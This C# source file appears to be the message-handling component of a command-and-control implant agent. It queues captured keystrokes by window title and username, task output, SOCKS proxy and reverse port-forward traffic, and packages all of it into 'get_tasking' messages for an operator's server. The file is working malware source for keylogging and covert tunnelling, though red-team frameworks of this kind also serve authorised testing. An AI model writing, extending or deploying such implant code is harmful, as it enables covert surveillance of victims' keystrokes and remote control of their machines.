using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Collections.Concurrent;
using System.Text;
using System.Text.Json;

namespace Agent.Managers
{
    public class MessageManager : IMessageManager
    {
        private ConcurrentDictionary<string, TaskResponse> responseResults = new ConcurrentDictionary<string, TaskResponse>();
        private List<string> responseStrings = new List<string>();
        private ConcurrentDictionary<int, ServerDatagram> socksOut = new ConcurrentDictionary<int, ServerDatagram>();
        private ConcurrentDictionary<int, ServerDatagram> rpfwdOut = new ConcurrentDictionary<int, ServerDatagram>();
        private ConcurrentBag<InteractMessage> interactiveOut = new ConcurrentBag<InteractMessage>();
        private ConcurrentBag<DelegateMessage> delegateMessages = new ConcurrentBag<DelegateMessage>();
        private ConcurrentDictionary<string, ServerJob> activeJobs = new ConcurrentDictionary<string, ServerJob>();
        private StringWriter sw = new StringWriter();
        private bool stdOutIsMonitored = false;
        private string monitoring_task = String.Empty;
        private TextWriter origStdOut;
        private string klTask = String.Empty;
        private Dictionary<string, Keylogs> klLogs = new Dictionary<string, Keylogs>();
        private ILogger logger { get; set; }

        public MessageManager(ILogger logger)
        {
            this.logger = logger;
        }
        public async Task AddKeystroke(string window_title, string task_id, string key)
        {
            if (String.IsNullOrEmpty(klTask))
            {
                klTask = task_id;
            }

            if (!klLogs.ContainsKey(window_title))
            {
                klLogs.Add(window_title, new Keylogs()
                {
                    window_title = window_title,
                    user = Environment.UserName,
                    builder = new StringBuilder()
                });
            }

            klLogs[window_title].builder.Append(key);
        }
        public async Task AddResponse(DelegateMessage dm)
        {
            this.delegateMessages.Add(dm);
            return;
        }
        public async Task AddResponse(InteractMessage im)
        {
            this.interactiveOut.Add(im);
        }
        public async Task AddResponse(DatagramSource source, ServerDatagram dg)
        {
            switch (source)
            {
                case DatagramSource.Socks5:
                    AddSocksMessage(dg);
                    break;
                case DatagramSource.RPortFwd:
                    AddRpfwdMessage(dg);
                    break;
                default:
                    break;
            }
        }
        private void AddSocksMessage(ServerDatagram dg)
        {
            socksOut.AddOrUpdate(dg.server_id, dg, (existingKey, existingValue) =>
            {
                // Key exists, update the existing ServerDatagram by adding bdata values
                existingValue.bdata = Misc.CombineByteArrays(existingValue.bdata, dg.bdata);
                //existingValue.bdata = Misc.CombineByteArrays(dg.bdata, existingValue.bdata);
                if (!existingValue.exit && dg.exit)
                {
                    existingValue.exit = true;
                }
                existingValue.data = Misc.Base64Encode(existingValue.bdata);
                return existingValue;
            });
        }
        private void AddRpfwdMessage(ServerDatagram dg)
        {
            rpfwdOut.AddOrUpdate(dg.server_id, dg, (existingKey, existingValue) =>
            {
                // Key exists, update the existing ServerDatagram by adding bdata values
                existingValue.bdata = Misc.CombineByteArrays(existingValue.bdata, dg.bdata);
                //existingValue.bdata = Misc.CombineByteArrays(dg.bdata, existingValue.bdata);
                if (!existingValue.exit && dg.exit)
                {
                    existingValue.exit = true;
                }
                existingValue.data = Misc.Base64Encode(existingValue.bdata);
                return existingValue;
            });
        }
        public async Task AddResponse(TaskResponse res)
        {
            if (!responseResults.ContainsKey(res.task_id))
            {
                responseResults.TryAdd(res.task_id, res);
            }

            TaskResponse newResponse = responseResults[res.task_id];

            if (!res.completed)
            {
                newResponse.completed = res.completed;
            }

            if (!string.IsNullOrEmpty(res.status))
            {
                newResponse.status = res.status;
            }
        }
        public async Task AddResponse(FileBrowserTaskResponse res)
        {
            this.responseStrings.Add(res.ToJson());
            if (res.completed)
            {
                this.activeJobs.Remove(res.task_id, out _);
            }
        }
        public async Task AddResponse(ProcessTaskResponse res)
        {
            this.responseStrings.Add(res.ToJson());
            if (res.completed)
            {
                this.activeJobs.Remove(res.task_id, out _);
            }
        }
        public async Task AddResponse(string res)
        {
            responseStrings.Add(res);
        }
        public List<string> GetTaskResponsesAsync()
        {
            foreach (TaskResponse response in responseResults.Values)
            {
                if (response.completed)
                {
                    activeJobs.Remove(response.task_id, out _);
                }
                this.responseStrings.Add(response.ToJson());
            }
            this.responseResults.Clear();

            List<string> returnResults = new List<string>(this.responseStrings);
            this.responseStrings.Clear();

            if (!string.IsNullOrEmpty(klTask) && klLogs.Count > 0)
            {
                KeyPressTaskResponse krr = new KeyPressTaskResponse
                {
                    task_id = klTask,
                    keylogs = klLogs.Values.ToList(),
                };

                krr.Prepare();
                returnResults.Add(krr.ToJson());
                klLogs.Clear();
            }
            responseResults.Clear();
            responseStrings.Clear();
          return returnResults;
        }
        public async Task Write(string? output, string task_id, bool completed, string status)
        {
            responseResults.AddOrUpdate(task_id, new TaskResponse { user_output = output, completed = completed, status = status, task_id = task_id }, (k, t) =>
            {
                TaskResponse newResponse = t;
                newResponse.user_output += output;
                if (completed)
                {
                    newResponse.completed = true;
                }
                if (!string.IsNullOrEmpty(status))
                {
                    newResponse.status = status;
                }
                return newResponse;
            });
        }
        public async Task Write(string? output, string task_id, bool completed)
        {
            await this.Write(output, task_id, completed, "");
        }
        public async Task WriteLine(string? output, string task_id, bool completed, string status)
        {
            responseResults.AddOrUpdate(task_id, new TaskResponse { user_output = output + Environment.NewLine, completed = completed, status = status, task_id = task_id }, (k, t) =>
            {
                var newResponse = (TaskResponse)t;
                newResponse.user_output += output + Environment.NewLine;
                if (completed)
                {
                    newResponse.completed = true;
                }
                if (!string.IsNullOrEmpty(status))
                {
                    newResponse.status = status;
                }
                return newResponse;
            });
        }
        public async Task WriteLine(string? output, string task_id, bool completed)
        {
            await WriteLine(output, task_id, completed, "");
        }
        public void AddJob(ServerJob job)
        {
            this.activeJobs.TryAdd(job.task.id, job);
        }
        public bool TryGetJob(string task_id, out ServerJob? job)
        {
            return this.activeJobs.TryGetValue(task_id, out job);
        }
        public Dictionary<string, ServerJob> GetJobs()
        {
            return this.activeJobs.ToDictionary(kvp => kvp.Key, kvp => kvp.Value, this.activeJobs.Comparer);
        }
        public void CompleteJob(string task_id)
        {
            activeJobs.TryRemove(task_id, out _);
        }
        public async Task<string> GetAgentResponseStringAsync()
        {
            GetTasking gt = new GetTasking()
            {
                action = "get_tasking",
                tasking_size = -1,
                delegates = delegateMessages.ToList(),
                socks = this.socksOut.Values.ToList(),
                responses = this.GetTaskResponsesAsync(),
                rpfwd = this.rpfwdOut.Values.ToList(),
                interactive = this.interactiveOut.Reverse().ToList(),
            };

            this.socksOut.Clear();
            this.rpfwdOut.Clear();
            this.delegateMessages.Clear();
            this.interactiveOut.Clear();

            return JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking);
        }
        public bool HasResponses()
        {
         return this.responseResults.Count > 0 || this.responseStrings.Count > 0 || this.delegateMessages.Count > 0 || this.socksOut.Count > 0 
                || this.rpfwdOut.Count > 0;
        }
        public bool CaptureStdOut(string task_id)
        {
            if (stdOutIsMonitored)
            {
                return false;
            }

            monitoring_task = task_id;
            return true;
        }
        public bool ReleaseStdOut()
        {
            stdOutIsMonitored = false;
            Console.SetOut(origStdOut);
            return true;
        }
        public bool StdIsBusy()
        {
            return stdOutIsMonitored;
        }
        public async Task<string> GetStdOut()
        {
            return String.Empty;
        }
    }
}
